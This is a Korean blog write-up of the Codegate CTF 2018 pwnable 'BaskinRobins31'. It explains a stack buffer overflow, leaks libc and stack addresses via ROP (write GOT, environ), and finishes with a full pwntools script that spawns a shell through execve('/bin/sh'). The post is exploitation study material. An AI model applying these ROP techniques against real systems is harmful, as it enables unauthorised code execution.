+++
title = "Codegate CTF 2018 Qual - BaskinRobins31"
date = "2024-07-09"
description = "Codegate CTF 2018 Qual pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "rop"]
+++
## 0x00. Introduction
``` bash
[*] '/home/user/BaskinRobins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Concept
베스킨라빈스 게임을 거꾸로해서 **1~3까지의 숫자를 고르면 (중요)** 31에서 빼고, 마지막 숫자 0을 부르는 사람이 지는 게임을 구현했다.


## 0x01. Vulnerability
``` c
__int64 __fastcall your_turn(_DWORD *a1)
{
  ...
  char buf[160]; // [rsp+10h] [rbp-B0h] BYREF

  len = read(0, buf, 0x190uLL);
  ...
}
```

취약점은 단순하게 내가 입력을 넣는 `your_turn()`에서 BOF가 발생한다.


## 0x02. Exploit
``` python
    payload = b"1" + b"A" * 0xaf
    payload += b"B" * 8          # sfp
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(elf.got['write'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    libc = u64(s.recv(1024)[0:6] + b"\x00\x00") - lib.symbols['write']
    system = libc + lib.symbols['execve']
    log.info(f"libc : {hex(libc)}")
    log.info(f"system : {hex(system)}")
```

BOF가 가능하니 ROP를 이용해서 libc leak을 했고 `execve` 주소까지는 잘 획득했다.
처음에는 `system`의 주소로 exploit을 진행했는데, stack alignment 때문인지 segmentation fault가 발생해서 `execve`로 바꿨더니 성공했다.

문제는 `execve`에 어떻게 `/bin/sh`를 전달하느냐인데, libc에서 찾아서 전달해도 되지만 `environ`을 이용한 stack leak으로 해결했다.

``` python
    payload = b"2" + b"C" * 0xaf
    payload += b"D" * 8
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(libc + lib.symbols['environ'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    environ = u64(s.recv(1024)[1:7] + b"\x00\x00")
    log.info(f"environ : {hex(environ)}")
    log.info(f"binsh : {hex(environ - 0x1d0)}")
```

이렇게 `environ`에 담겨있는 stack 영역 주소를 받아와서 `buf+0x8`과의 offset 차이를 계산한 후, `buf+0x8`에 `/bin/sh` 문자열을 넣어서 `execve` 함수의 인자로 전달했다.

``` python
    payload = b"3" + b"E" * 7
    payload += b"/bin/sh\x00"                   # buf + 0x8
    payload += b"F" * (0xb0 - len(payload))
    payload += b"G" * 8
    payload += p64(bp['pppr'])
    payload += b"H" * 0x18
    payload += p64(bp['pppr'])
    payload += p64(environ - 0x1d0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(system)
    s.sendline(payload)

    s.interactive()
```

그런데 마지막 payload에서 `pppr` 가젯에 갈때 이상하게 `rsi` 값만 이상해져서 쉘이 자꾸 안떴다.

``` bash
➜  0x40097a <your_turn+214>  ret
    ↳   0x40087a <helper+4>       pop    rdi
        0x40087b <helper+5>       pop    rsi
        0x40087c <helper+6>       pop    rdx
        0x40087d <helper+7>       ret
gef➤  x/4gx $rsp
0x7fffffffe188: 0x000000000040087a      0x00007fffffffe0d8
0x7fffffffe198: 0x00000000fffffffd      0x000000000000000
```

처음에는 뭐지 싶어서 그냥 `pppr` 가젯을 두 번 호출하는 것으로 해결했는데...

```
.text:000000000040095D  mov     rax, [rbp+var_B8]
.text:0000000000400964  mov     eax, [rax]
.text:0000000000400966  sub     eax, [rbp+choice]
```

알고보니 베스킨라빈스 게임을 하면서 내가 입력한 값이 감소하는 것이었다 ㅋㅋㅋㅋ

그래서 어? 앞에서는 왜 잘 됐지? 하고 확인해보니...

``` c
write(1, write_got, 8 - 1);
write(1, write_got, 8 - 2);
```

앞의 ROP payload에서는 `write`의 `size` 인자값에서 1, 2만큼 빠졌고, 주소값이 어차피 8바이트를 다 안쓰니까 괜찮았던거였다 ㅋㅋㅋㅋ

Payload를 작성할 때 dummy를 다르게 구성해서 어느 payload가 전달된건지 알 수 있게끔 하려고 한건데, 이런 나비효과가 발생할 줄이야...


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "BaskinRobins31"
LIBRARY = "libc.so.6"

bp = {
    'main' : 0x0000000000400a4b,
    'end_of_main' : 0x0000000000400b5a,
    'your_turn' : 0x00000000004008a4,
    'end_of_your_turn' : 0x000000000040097a,
    'pppr' : 0x40087a,                          # pop rdi; pop rsi; pop rdx
}

gs = f'''
b *{bp['end_of_your_turn']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recv(1024)

    payload = b"1" + b"A" * 0xaf
    payload += b"B" * 8          # sfp
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(elf.got['write'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    libc = u64(s.recv(1024)[0:6] + b"\x00\x00") - lib.symbols['write']
    system = libc + lib.symbols['execve']
    log.info(f"libc : {hex(libc)}")
    log.info(f"system : {hex(system)}")

    payload = b"2" + b"C" * 0xaf
    payload += b"D" * 8
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(libc + lib.symbols['environ'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    environ = u64(s.recv(1024)[1:7] + b"\x00\x00")
    log.info(f"environ : {hex(environ)}")
    log.info(f"binsh : {hex(environ - 0x1d0)}")

    payload = b"3" + b"E" * 7
    payload += b"/bin/sh\x00"
    payload += b"F" * (0xb0 - len(payload))
    payload += b"G" * 8
    payload += p64(bp['pppr'])
    payload += b"H" * 0x18
    payload += p64(bp['pppr'])
    payload += p64(environ - 0x1d0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(system)
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```